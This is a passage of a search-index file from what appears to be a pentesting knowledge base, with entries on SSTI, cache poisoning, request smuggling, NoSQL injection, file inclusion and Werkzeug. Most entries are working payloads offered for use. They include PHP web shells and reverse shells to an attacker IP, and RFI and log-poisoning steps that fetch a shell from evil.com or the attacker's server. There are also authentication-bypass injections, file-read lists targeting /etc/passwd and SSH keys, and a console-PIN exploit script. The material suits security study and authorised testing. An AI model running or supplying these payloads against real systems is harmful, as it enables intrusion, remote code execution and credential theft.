\\u0120: space # \\u010D: \\r # \\u010A: \\n ?url=http://example.com\\u0120HTTP/1.1\\u010D\\u010APOST\\u0120/update\\u0120HTTP/1.1\\u010D\\u010AContent-Length:\\u012028\\u010D\\u010A\\u010D\\u010Ausername=admin\u0026password=pass\\u010D\\u010A\\u010D\\u010AGET\\u0120 "
            }
        );
    index.add(
            {
                id:  97 ,
                href: "\/docs\/hdks\/web\/security-risk\/ssti\/",
                title: "SSTI (Server-Side Template Injection)",
                description: "Automation linkTplmap is a program for Server-Side Template Injection and Code Injection.\n./tplmap.py -u http://vulnerable.com/?name=test Identify the Template Engine/Framework/Language link Payload Template Engine/Framework/Language a{*comment*}b Smarty #{ 2*3 } Pug, Spring *{ 2*3 } Spring ${\"z\".join(\"ab\")} Mako, ??? {{ '7'*7 }} Angular, Django, Flask, Go, Jinja2, Tornado, Twig, ??? {{:2*3}} JsRender {% debug %} Django SSTI for Each Framework linkPlease see each article for details about SSTI.\nAngular Django Flask/Jinja2 Go JsRender Pug Spring Tornado ",
                content: "Automation linkTplmap is a program for Server-Side Template Injection and Code Injection.\n./tplmap.py -u http://vulnerable.com/?name=test Identify the Template Engine/Framework/Language link Payload Template Engine/Framework/Language a{*comment*}b Smarty #{ 2*3 } Pug, Spring *{ 2*3 } Spring ${\"z\".join(\"ab\")} Mako, ??? {{ '7'*7 }} Angular, Django, Flask, Go, Jinja2, Tornado, Twig, ??? {{:2*3}} JsRender {% debug %} Django SSTI for Each Framework linkPlease see each article for details about SSTI.\nAngular Django Flask/Jinja2 Go JsRender Pug Spring Tornado "
            }
        );
    index.add(
            {
                id:  98 ,
                href: "\/docs\/hdks\/web\/security-risk\/web-cache-poisoning\/",
                title: "Web Cache Poisoning",
                description: "Reflected XSS with Cache Poisoning linkIf the website reflects our arbitrary path in the result such as below. https://example.com/xyz # Output in the 404 page Page not found: /xyz We may try XSS as below. https://example.com/xyz If we use Burp Repeater to send the request above, the URL wont be normalized so leads the reflected XSS. Then the cache will be poisoned. In this state, if you ask the victim to visit this URL, they will see this cached result.",
                content: "Reflected XSS with Cache Poisoning linkIf the website reflects our arbitrary path in the result such as below.\nhttps://example.com/xyz # Output in the 404 page Page not found: /xyz We may try XSS as below.\nhttps://example.com/xyz If we use Burp Repeater to send the request above, the URL wont be normalized so leads the reflected XSS. Then the cache will be poisoned. In this state, if you ask the victim to visit this URL, they will see this cached result. In other words, the reflected XSS is performed despite URL normalization in the victims web browsers.\nMeta Tag XSS link GET /?id=1 HTTP/1.1 Host: victim.com X-Forwarded-Host: evil.com ... HTTP/1.1 200 OK Cache-Control: public, no-cache ... Exploit link GET /?id=2 HTTP/1.1 Host: victim.com X-Forwarded-Host: evil.com\"\u003e ... HTTP/1.1 200 OK Cache-Control: public, no-cache ... \" /\u003e Meta Tag CSP Overriding linkIf the website sets CSP (Content-Security-Policy) using meta tag, we can override this CSP settings by cache poisoning, then we can bypass CSP and may cause other attacks.\nGET /?id=2 HTTP/1.1 Host: victim.com X-Forwarded-Host: victim.com\"\u003e ... HTTP/1.1 200 OK Cache-Control: public, no-cache ... "
            }
        );
    index.add(
            {
                id:  99 ,
                href: "\/docs\/hdks\/reconnaissance\/email-analysis\/",
                title: "Email Analysis",
                description: "Detecting malware from messages, check if they are phishing.",
                content: "OSINT link InQuest Labs\nMessage Header Analyzer\nAnalyses message header of email. It helps to check the phishing emails.\nPhishTool\nCombines threat intelligence, OSINT, email metadata and battle tested auto-analysis pathways into one powerful phishing response platform.\nSimple Email Reputation\nPaste the senders email address to check if the address is suspicious.\nVirusTotal\nEmail Source Analysis linkWe can see the email source in each provider or execute the following commands.\nopen example.xml strings example.eml Check the following headers to distinguish whether it is spoofed.\nAuthentication-Results linkEach value in dkim, spf, dmarc should be pass. If not, the email may be spoofed.\nReceived linkIt should match the senders email address.\nReceived-SPF linkIts value should be pass. If its value is faile, softfail, neutral or none, the email may be spoofed.\nOthers linkBesides, check if the sender displayed name or address match From, Reply-To, Return-Path in headers. However, these header values can be modified by attackers so it could not be relied perfectly.\nCheck SPF, DKIM, DMARC Records of Domain linkTo confirm if these records exist in a domain, use dig command. If not exist, the domain may be spoofed, or may be categorized spam by some email providers.\ndig example.com txt Also we can check that using online tools such as MxToolbox.\nSPF Record link dig example.com txt # output example: example.com. IN TXT \"v=spf1 include:spf.example.com -all\" example.com. IN TXT \"v=spf1 +ip4:10.0.0.1/24 -all\" example.com. IN TXT \"v=spf1 a:mail.example.com -all\" example.com. IN TXT \"v=spf1 -all\" example.com. IN TXT \"v=spf1 mx -all\" Check DKIM Record link dig selector._domainkey.example.com txt # output examples: selector._domainkey.example.com IN TXT k=rsa;p=J8eTBu224i086iK selector._domainkey.example.com IN TXT \"selector._domainkey.example.com. 0 IN TXT \"v=DKIM1; p=ABC...123;\"\" To check DKIM record, we need to specify the DKIM selector. It can be found in s= header value of dkim section in email header such as Authentication-Results. For example,\nAuthentication-Results: mx.google.com; dkim=pass header.i=@example.com header.s=s1234 header.b=ABCDEF123 In this case, we execute dig [s1234.example.com](http://s1234.example.com) txt .\nCheck DMARC Record link dig _dmarc.example.com txt # output examples: _dmarc.example.com. IN TXT \"v=DMARC1; p=reject; rua=mailto:mailauth-reports@example.com\" Be Careful of Fake Reply Message linkIf the email contains RE: (Regarding) which means replying your message, we need to check that its a really reply message. Attacker may impersonate reply message that victim communicated in the past.\nMalware Detection in Attached Files linkIf you got email in which attached suspicious files, you need to investigate them.\nView the Message Source\nCopy the Attached Files Base64\nChange Base64 to SHA256\nsha256sum attached_file.doc # or echo -n 'abcde..==' \u003e hash.txt sha256sum hash.txt Or there are some useful tools:\nCyberChef is useful to change the cipher. Investigate the Hash\nThere are some useful tools:\nInQuest Labs\nTalos File Reputation\nVirusTotal\n"
            }
        );
    index.add(
            {
                id:  100 ,
                href: "\/docs\/hdks\/web\/go-ssti\/",
                title: "Go SSTI",
                description: "Golang html template is vulnerable to SSTI (Server Side Template Injection).",
                content: "Investigation link import \"html/template\" ... template.New(\"foo\").Parse(\"{{ . }}\") If a website uses a web framework written in Golang and uses html/template module for parsing a template file or strings, we may inject this template with our custom template file/string.\nExploit linkAssume a web application defines User struct, GetFile method, and ExecuteCmd method.\n// `main.go` of target website type User struct { Id string Name string } // Read contents of the file and output it. func GetFile(filepath string) { ... } // Execute system command. func ExecuteCmd(cmd string) { ... } Payloads link {{ . }} # Get the `User` struct values. {{ .User }} # Call the `GetFile` method to LFI. {{ .GetFile \"/etc/passwd\" }} # Call the `ExecuteCmd` method to RCE. {{ .ExecuteCmd \"whoami\" }} Also, if the website parses arbitrary template file, which concludes malicious payload like above, in some way e.g. SSRF(https://example.com/?file=http://evil.com/template.txt)\nThis file will be parsed by the website and lead SSTI.\n"
            }
        );
    index.add(
            {
                id:  101 ,
                href: "\/docs\/hdks\/web\/security-risk\/http-request-smuggling\/",
                title: "HTTP Request Smuggling",
                description: "It is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.",
                content: "Investigation linkAssume the website has the following HTTP specification.\nPOST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Content-Length: 29 username=admin\u0026password=admin If we change Content-Length to Transfer-Encoding as follow, the data is sent in chunks to server. Each chunk consists of the chunk size in bytes (it is expressed in hexadecimal).\nThe message is terminated with a chunk of size zero.\nPOST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked 1d username=admin\u0026password=admin 0 By the way, Transfer-Encoding header is not allowed in HTTP/2.\nExploitation Automatically linkBurpSuite has the useful extension HTTP Request Smuggler.\nCL.TE (Content-Length . Transfer-Encoding) linkThe front-end server uses Content-Length header and the back-end server uses Transfer-Encoding header.\nSend the following request twice.\nPOST /item HTTP/1.1 Host: example.com Content-Length: 9 Transfer-Encoding: chunked 0 EVIL If the response delays, we may be able to request smuggling.\nExploitation linkThe front-end server uses the Content-Length header, so\nPOST /item HTTP/1.1 Host: example.com Content-Length: 9 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: example.com Foo: xGET / HTTP/1.1 Host: example.com TE.CL (Transfer-Encoding . Content-Length) linkThe front-end server uses Trans-Encoding header and the back-end server uses Content-Length header.\nSend the following request twice.\nIf you use BurpSuite, check the Update Content-Length option is unchecked to avoid BurpSuite automatically changes the Content-Length depending on data sent.\nPOST HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Content-Length: 3 Transfer-Encoding: chunked 4 EVIL 0 If the response delays, we may be able to request smuggling.\nExploitation linkSend the following request twice.\nPOST / HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Content-Length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 TE.TE (Transfer-Encoding . Transfer-Encoding) linkBoth the front-end server and the back-end server support the Transfer-Encoding header but one of the servers can be induced not to process it by obfuscating the header.\nTransfer-Encoding: xchunked Transfer-Encoding: chunked Transfer-Encoding: x CL.0 (Content-Length: 0) linkIf the target website ignores the Content-Length, youre able to access the restricted page by request smuggling.\n1. Prepare the Two Same Requests linkIf youre using Burp Suite, send the target request to Repeater twice.\n2. Change the First Request to POST Request link3. Set the Content-Length: 0 in the First Request link4. Set the Connection: keep-alive in the First Request linkNow two requests should look like:\n# Request 1 POST / HTTP/1.1 Host: example.com Cookie: key=value Connection: keep-alive Content-Length: 0 GET /admin/delete?username=john Foo: x # ------------------------------------------------- # Request 2 GET / HTTP/1.1 Host: example.com Cookie: key=value Connection: close 5. Send Requests in Order linkFirst off, if youre using Burp Suite, note that enabling the Update Content-Length in the Burp Repeater option. The sequence is Request 1 -\u003e Request 2.\nHTTP/2 CL.0 (Content-Length: 0) link1. Prepare Request linkIf youre using Burp Suite, note that disable Update Content-Length and enable Allow HTTP/2 ALPN override in the Burp Repeater option.\nThe request shoud look like:\nPOST / HTTP/2 Host: example.com Content-Length: 0 GET /exploit HTTP/1.1 Host: attacker.com Content-Length: 5 x=1 2. Send Request linkBefore doing, dont forget to expand the Inspector on the right in the Repeater and select HTTP/2.\nNow send the request a few times.\nmod_proxy Misconfiguration on Apache 2.4.0, 2.4.55(CVE-2023-25690) linkReference: https://github.com/dhmosfunk/CVE-2023-25690-POC\nIf target web server allows any characters (.*) in RewriteRule, it causes HTTP request smuggling.\nRewriteEngine on RewriteRule \"^/products/(.*)\" \"http://127.0.0.1:8080/?productId=$1\" [P] ProxyPassReverse \"/\" \"http://127.0.0.1:8080:/\" Send Request with CRLF (\\r\\n) Injection link GET /products/1%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1 # It means the following: # # GET /products/1 HTTP/1.1 # Host: 127.0.0.1 # # GET /SMUGGLED HTTP/1.1 "
            }
        );
    index.add(
            {
                id:  102 ,
                href: "\/docs\/hdks\/web\/method\/web-server-security-misconfiguration\/",
                title: "Web Server Security Misconfiguration",
                description: "If web servers may be configured improperly, we have to reconfigure them properly. This page gives you checklists for likely misconfiguration.",
                content: "Checklist link The admin page allows non-admin users to access. Directory listing is enabled. Test environment is public. Default username and password. Admins password is easy to guess e.g. admin, password123, etc. The software is out of date or vulnerable version. Attacker-friendly error messages are displayed e.g. it reveals the software version. A cloud service provider (CSP) has default sharing permissions. Unsecure http protocol is used rather than https. Check CSP (Content-Security-Policy) linkWe can check if the CSP is vulnerable or not using online tools as below.\nCSP Evaluator Security Headers link https://securityheaders.com/ "
            }
        );
    index.add(
            {
                id:  103 ,
                href: "\/docs\/hdks\/web\/security-risk\/nosql-injection\/",
                title: "NoSQL Injection",
                description: "NoSQL Injection is derived from SQL Injection. It affects NoSQL database such as MongoDB, Apache Cassandra.",
                content: "Manual Injection linkSee also Web Login Bypass NoSQL Injection.\nMongo linkIf the web application uses MongDB, you might be able to fetch the users information.\nIt allows you to bypass authentication.\n/?username=admin\u0026password[$ne]=xyz /?username[$ne]=admin\u0026role=guest /?id[$gt]=1\u0026username=john Syntax\nBelow are the payloads to syntax injection. Dont forget to try the URL-encoded payloads.\ntest||1==1 test%7C%7C1%3D%3D1 test||1==1// test%7C%7C1%3D%3D1%2F%2F test||1==1%00 test%7C%7C1%3D%3D1%2500 test||1==1\\u0000 test%7C%7C1%3D%3D1%5Cu0000 test||'1==1 test%7C%7C%271%3D%3D1 test||'1'=='1' test%7C%7C%271%27%3D%3D%271%27 test||'1'=='1 test%7C%7C%271%27%3D%3D%271 test'||1||' test%27%7c%7c%31%7c%7c%27 admin' \u0026\u0026 this.password!=' admin'+%26%26+this.password!%3d' Operators\n# $ne: Not equal username[$ne]=xyz\u0026password[$ne]=xyz # $regex: Regular expressions username[$regex]=.*\u0026password[$regex]=.* # $gt: Greater than username[$gt]=s\u0026password[$gt]=s # $lt: Lower than username[$lt]=s\u0026password[$lt]=s Operators \u0026 JSON\nTo use the following payloads, set the Content-Type header to application/json in the HTTP request header.\n{ \"username\": { \"$ne\": \"xyz\" }, \"password\": { \"$ne\": \"xyz\" } } Brute force parameters.\n# Brute force each character for the parameter key { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"Object.keys(this)[1].match('^.{0}a.*')\" }} { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"Object.keys(this)[1].match('^.{0}b.*')\" }} { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"Object.keys(this)[1].match('^.{0}c.*')\" }} ... { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"Object.keys(this)[1].match('^.{1}a.*')\" }} ... { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"Object.keys(this)[8].match('^.{8}z.*')\" }} # Brute force each character for the specific parameter value { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"this.exampleToken.match('^.{0}a.*')\" } { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"this.exampleToken.match('^.{0}b.*')\" } { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"this.exampleToken.match('^.{0}c.*')\" } ... { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"this.exampleToken.match('^.{1}a.*')\" } ... { \"username\": \"admin\", \"password\": \"test\", { \"$where\": \"this.exampleToken.match('^.{8}z.*')\" } Retrieve Another Document (MongoDB) linkIf the website uses MongoDB and uses $match aggregation to fetch documents, we can change the aggregation to $lookup for joining another document and get desired information from the document.\nFirst, check if the $match operator is used in the website.\nPOST /products HTTP/1.1 ... { \"$match\": { \"sold\": false } } As above, the website uses $match aggregator to fetch data from the products document, so we can change this as the following.\nAssume both the products and users document have an id field.\nPOST /users HTTP/1.1 ... { \"$lookup\": { \"from\": \"users\", \"localField\": \"id\", \"foreignField\": \"id\", \"as\": \"test\" } } Then send this request. We can retrieve values in the users document.\n"
            }
        );
    index.add(
            {
                id:  104 ,
                href: "\/docs\/hdks\/web\/php-rce-cheat-sheet\/",
                title: "PHP RCE Cheat Sheet",
                description: "Web Shell link \u003c?php system($_GET['cmd']);?\u003e \u003c?php echo system($_GET['cmd']);?\u003e \u003c%3fphp+system($_['cmd']);%3f\u003e \u003c%3fphp+echo+system($_['cmd']);%3f\u003e We can access to /?cmd=whoami. Reverse Shell link \u003c?php system('bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261');?\u003e \u003c?php system('bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\"');?\u003e \u003c%3fphp+system('bash+-i+\u003e%26+%2fdev%2ftcp%2f10.0.0.1%2f4444+0\u003e%261');%3f\u003e \u003c%3fphp+system('bash+-c+\"bash+-i+\u003e%26+%2fdev%2ftcp%2f10.0.0.1%2f4444+0\u003e%261\"');%3f\u003e ",
                content: "Web Shell link \u003c?php system($_GET['cmd']);?\u003e \u003c?php echo system($_GET['cmd']);?\u003e \u003c%3fphp+system($_['cmd']);%3f\u003e \u003c%3fphp+echo+system($_['cmd']);%3f\u003e We can access to /?cmd=whoami.\nReverse Shell link \u003c?php system('bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261');?\u003e \u003c?php system('bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\"');?\u003e \u003c%3fphp+system('bash+-i+\u003e%26+%2fdev%2ftcp%2f10.0.0.1%2f4444+0\u003e%261');%3f\u003e \u003c%3fphp+system('bash+-c+\"bash+-i+\u003e%26+%2fdev%2ftcp%2f10.0.0.1%2f4444+0\u003e%261\"');%3f\u003e "
            }
        );
    index.add(
            {
                id:  105 ,
                href: "\/docs\/hdks\/reconnaissance\/subdomain-discovery\/",
                title: "Subdomain Discovery",
                description: "Finding subdomains is a method of reconnaissance.",
                content: "Automation link # https://github.com/projectdiscovery/subfinder subfinder -d example.com subfinder -d example.com -o domains.txt # https://github.com/blechschmidt/massdns ./scripts/subbrute.py lists/names.txt example.com | ./bin/massdns -r lists/resolvers.txt -t A -o S \u003e results.txt # https://github.com/guelfoweb/knock knockpy vulnerable.com # Using wordlist knockpy -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt vulnerable.com # https://github.com/lc/gau printf example.com | gau cat domains.txt | gau --threads 5 # https://github.com/aboul3la/Sublist3r python3 sublist3r.py -d example.com # This sends requests a target web server directly so be careful # -mc: Match status code ffuf -u https://FUZZ.example.com -w wordlist.txt -mc 200,301,302,403 gobuster dns -d example.com -w wordlist.txt # -r: Custome DNS resolver. Specify the target ip address. gobuster dns -d example.com -w subdomains.txt -r 10.0.0.1 # https://github.com/owasp-amass/amass amass enum -d example.com -v # https://github.com/gwen001/github-subdomains # *required to set GitHub token github-subdomains -d example.com Manual Discovery linkWe can also find subdomains using Google Dorks.\nsite:example.com OSINT link nmmapper "
            }
        );
    index.add(
            {
                id:  106 ,
                href: "\/docs\/hdks\/web\/security-risk\/file-inclusion\/",
                title: "File Inclusion (LFI/RFI)",
                description: "Local File Inclusion (LFI) and Remote File Inclusion (RFI) are vulnerabilities that are often found to affect web applications that rely on a scripting run time.",
                content: "Local File Inclusion (LFI) link ?page=../ ?page=/etc/passwd ?page=../../../../etc/passwd ?page=../../../../../etc/passwd ?page=..//..//..//..//..//etc/passwd ?page=....//....//....//....//etc/passwd ?page=....//....//....//....//....//....//etc/passwd ?page=.....///.....///.....///.....///etc/passwd ?page=../../../../../../../../../../../../../../etc/passwd ?page=..\\/..\\/..\\/..\\/etc/passwd ?page=/etc/passwd\u0026 ?page=/etc/passwd%00 ?page=example.php%00.txt ?page=/etc/passwd%00.inc ?page=/etc/passwd%00.php ?page=http://localhost/index ?page=http://localhost:3000/index.html ?page=http://localhost:8000/index.html ?page=somedir/../../../../etc/passwd\u0026ext= # URL encoding ?page=..%2F..%2F..%2F..%2Fetc/passwd ?page=..%5C..%5C..%5C..%5Cetc/passwd ?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd ?page=http:%5C%5Cindex # URL double encoding ?page=..%252F..%252F..%252F..%252fetc/passwd ?page=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd ?page=http:%252F%252Findex # UTF-8 encoding ?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd # Dot truncation ?page=../../../../etc/passwd.......................................................... # File scheme ?page=file:///etc/passwd ?page=file:%2F%2F%2Fetc%2Fpasswd ?page=file:%252F%252F%252Fetc%252Fpasswd ?page=file%3A///etc/passwd ?page=file%3A%2F%2F%2Fetc%2Fpasswd ?page=file%3A%252F%252F%252Fetc%252Fpasswd ?page=file://var/www/html/index.php ?page=file://var/www//index.php # Other local web servr ?page=http://127.0.0.1/ ?page=http://127.0.0.1:3000/ ?page=http://127.0.0.1:8000/ # PHP Filter ?page=php://filter/resource=/etc/passwd ?page=php://filter/read=string.rot13/resource=index.php ?page=php://filter/convert.base64-encode/resource=index.php ?page=pHp://filter/convert.base64-encode/resource=index.php ?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd ?page=data://text/plain,\u003c?php echo base64_encode(file_get_contents(index.php)); ?\u003e # PHP Filter - Base64 encoding. The payloa is \"\u003c?php system($_GET['cmd']); ?\u003e\" ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ To automate this process, we can fuzzing as follow.\nffuf -u http://example.com/?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt ffuf -u http://example.com/?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt Interesting Files linkWhen our payload is successful, we can additionaly investigate local files and retrieve sensitivin information.\n# Home directories ?page=/home//.bashrc ?page=/home//.bash_history ?page=/home//.bash_logout ?page=/home//.bash_profile ?page=/home//.profile ?page=/home//.ssh/id_rsa # Root directory ?page=/root/.bashrc ?page=/root/.bash_history ?page=/root/.bash_logout ?page=/root/.bash_profile ?pgae=/root/.profile ?page=/root/.ssh/id_rsa # Mail ?page=/var/mail/ ?page=/var/spool/mail/ # Host ?page=/etc/hosts # Cron ?page=/etc/crontab # Web root ?page=/var/www/html/index.html ?page=/var/www/html/index.php ?page=/var/www/html/.htaccess ?page=/var/www/html/.htpasswd ?page=/var/www/example.com/index.php ?page=/var/www/sudomain/index.php ?page=/var/www/subdomain.example.com/index.php ?page=/var/www/wordpress/index.php # Apache ?page=/etc/apache2/sites-enabled/000-default.conf ?page=/etc/apache2/sites-enabled/domain.conf ?page=/etc/apache2/sites-enabled/example.com.conf ?page=/etc/apache2/sites-enabled/sub.example.com.conf ?page=/etc/apache2/sites-enabled/sub.conf ?page=/etc/apache2/sites-available/domain.conf ?page=/etc/apache2/sites-available/example.com.conf ?page=/etc/apache2/sites-available/sub.example.com.conf ?page=/etc/apache2/sites-available/sub.conf ?page=/etc/apache2/.htpasswd ?page=/var/log/apache/access.log ?page=/var/log/apache/error.log ?page=/var/log/apache2/access.log ?page=/var/log/apache2/error.log # Nginx ?page=/var/log/nginx/access.log ?page=/var/log/nginx/error.log ?page=/etc/nginx/nginx.conf ?page=/etc/nginx/conf.d/.htpasswd ?page=/etc/nginx/conf.d/example.com.conf ?page=/etc/nginx/conf.d/example.conf ?page=/etc/nginx/conf.d/subdomain.example.com.conf ?page=/etc/nginx/conf.d/subdomain.conf ?page=/etc/nginx/sites-available/example.com.conf ?page=/etc/nginx/sites-enabled/default ?page=/etc/nginx/sites-enabled/example.com.conf ?page=/usr/local/nginx/conf/nginx.conf ?page=/usr/local/etc/nginx/nginx.conf # PHP web conf (x.x is specified PHP version) ?page=/etc/php/x.x/apache2/php.ini ?page=/etc/php/x.x/cli/php.ini ?page=/etc/php/x.x/fpm/php.ini # BIND ?page=/etc/bind/named.conf ?page=/etc/bind/named.conf.options ?page=/etc/bind/named.conf.local ?page=/etc/bind/named.conf.default-zones # Windows ?page=../../../../../../../../windows/system32/drivers/etc/hosts ?page=C:/Windows/System32/drivers/etc/hosts ?page=C:/Users/Public/Desktop/desktop.ini ?page=C:/Users/FUZZ/Desktop/desktop.ini # user enumeration ?page=C:/inetpub/wwwroot/ ?page=C:/xampp/apache/conf/httpd.conf ?page=C:/xampp/apache/conf/extra/httpd-userdir.conf ?page=C:/xampp/apache/conf/extra/httpd-vhosts.conf ?page=C:/xampp/apache/conf/extra/httpd-xampp.conf ?page=C:/xampp/apache/conf/extra/httpd-ajp.conf ?page=C:/xampp/apache/logs/access.log ?page=C:/xampp/apache/logs/error.log ?page=C:/xampp/cgi-bin/example.cgi ?page=C:/xampp/htdocs/example.com/index.php ?page=C:/xampp/htdocs/sub.example.com/index.php ?page=C:/xampp/phpMyAdmin/index.php ?page=C:/xampp/phpMyAdmin/config.inc.php Read Process Commands linkWe can retrieve commands that start processes by enumerating /proc/PID/cmdline. Create a Python script that enumerates them. We can refer to this blog posts This leaves the server vulnerable to Local File Inclusion. section.\n# lfi.py import requests import time for i in range(10): print(f\"[+] Trying {i}\") url = \"http://example.com/?file=/proc/\" + i + \"/cmdline\" resp = requests.get(url) print(resp.content) time.sleep(1) Then execute this file.\npython3 lfi.py Remote File Inclusion (RFI) link ?page=//evil.com/exploit ?page=%2F%2fevil.com/exploit ?page=%2C%2Cevil.com/exploit ?page=http://evil.com/exploit ?page=http%3A//evil.com/exploit ?page=http%3A%2F%2Fevil%2Ecom/exploit ?page=http%253A%252F%252Fevil%252Ecom/ ?page=test@sub.example.com/ Steal NTLM Hashes (Windows) linkIf the website is hosted on Windows, we may be able to retrieve password hashes using Responder.\nIn local machine, start responder.\n# -I: Interface e.g. eth0, tun0, etc. sudo responder -I tun0 Then send request to https://example.com/?page=///test.\nNow we may be able to capture the hashes.\nIf so, we can crack it using JohnTheRipper or Hashcat. Please refer to this page for cracking NTLM.\nRemote Code Execution (RCE) linkphp_filter_chain_generator is CLI that generates payload for PHP filter bypass and allow us to RCE.\nBelow is the payload for reverse shell.\nwget https://raw.githubusercontent.com/synacktiv/php_filter_chain_generator/main/php_filter_chain_generator.py python3 php_filter_chain_generator.py --chain \"\u003c?php system('bash -c \\\"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\\\"')?\u003e\" Then copy the output and paste it to the target.\nLog Poisoning link1. Check if You Can Access the Apache Log File link # Debian, Ubuntu Linux /?page=/var/log/apache/access.log /?page=../../../../var/log/apache/access.log /?page=/var/log/apache2/access.log /?page=../../../../var/log/apache2/access.log # FreeBSD Linux /?page=/var/log/httpd-access.log /?page=../../../../var/log/httpd-access.log # CentOS, Fedora, RedHat Linux /?page=/var/log/httpd/access_log /?page=../../../../var/log/httpd/access_log 2. Prepare the Payload for PHP Reverse Shell link wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php # Edit the values in the payload $ip = ''; $port = 4444; 3. Open Web Server in Local Machine link python -m http.server 80 4. Inject PHP Payload in the User-Agent linkSend the GET Request with abusing the User-Agent.\nThe payload can be uploaded to the /shell.php of the target website.\nGET / HTTP/1.1 ... User-Agent: \u003c?php file_put_contents('shell.php', file_get_contents('http:///shell.php')); ?\u003e If we got some error such as 500 Internal Server Error when the next steps, try to modify the payload a bit. For example,\nChange single quotes () to double quotes (\"). Change double quotes (\") to single quotes (). Change \u003c?php to \u003c?pHp. (PHP filter bypass) 5. Apply the Injection linkRefresh the page /index.php?page=../../../../var/log/apache2/access.log .\n6. Open Listener for Reverse Shell linkIn you local machine, open the listener.\nYou need to specify the port which you set the section 2.\nnc -lvnp 4444 7. Gain Access to Shell linkAccess to /shell.php of the target website.\nIf it goes well, you can get a shell.\n"
            }
        );
    index.add(
            {
                id:  107 ,
                href: "\/docs\/hdks\/web\/framework\/python\/werkzeug-pentesting\/",
                title: "Werkzeug Pentesting",
                description: "Werkzeug is a comprehensive WSGI web application library that is commonly used for Flask web application.",
                content: "SSTI linkPlease see Flask Jinja2 SSTI\nRemote Code Execution (RCE) in Console linkMetasploit link msfconsole msf\u003e use exploit/multi/http/werkzeug_debug_rce Manual Exploitation linkIf we can access to /console page, we may be able to execute RCE.\n__import__('os').popen('whoami').read(); import os; print(os.popen(\"whoami\").read()) # Reverse shell __import__('os').popen('bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\"').read() Console PIN Exploit linkReference: https://www.daehee.com/werkzeug-console-pin-exploit/\nIf the website is locked by PIN code in the /console page, you need to unlock it.\ndef get_pin_and_cookie_name(app): pin = os.environ.get('WERKZEUG_DEBUG_PIN') rv = None num = None # Pin was explicitly disabled if pin == 'off': return None, None # Pin was provided explicitly if pin is not None and pin.replace('-', '').isdigit(): # If there are separators in the pin, return it directly if '-' in pin: rv = pin else: num = pin modname = getattr(app, '__module__', getattr(app.__class__, '__module__')) try: # `getpass.getuser()` imports the `pwd` module, # which does not exist in the Google App Engine sandbox. username = getpass.getuser() except ImportError: username = None mod = sys.modules.get(modname) # This information only exists to make the cookie unique on the # computer, not as a security feature. probably_public_bits = [ username, modname, getattr(app, '__name__', getattr(app.__class__, '__name__')), getattr(mod, '__file__', None), ] # This information is here to make it harder for an attacker to # guess the cookie name. They are unlikely to be contained anywhere # within the unauthenticated debug page. private_bits = [ str(uuid.getnode()), get_machine_id(), ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, text_type): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num return rv, cookie_name Variable needed to exploit the console PIN.\nprobably_public_bits = [ username, modname, getattr(app, '__name__', getattr(app.__class__, '__name__')), getattr(mod, '__file__', None), ] private_bits = [ str(uuid.getnode()), get_machine_id(), ] Once all variable prepared, run the following script to generate the console PIN:\nimport hashlib from itertools import chain probably_public_bits = [ 'user',# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ '279275995014060',# str(uuid.getnode()), /sys/class/net/ens33/address 'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') #h.update(b'shittysalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is 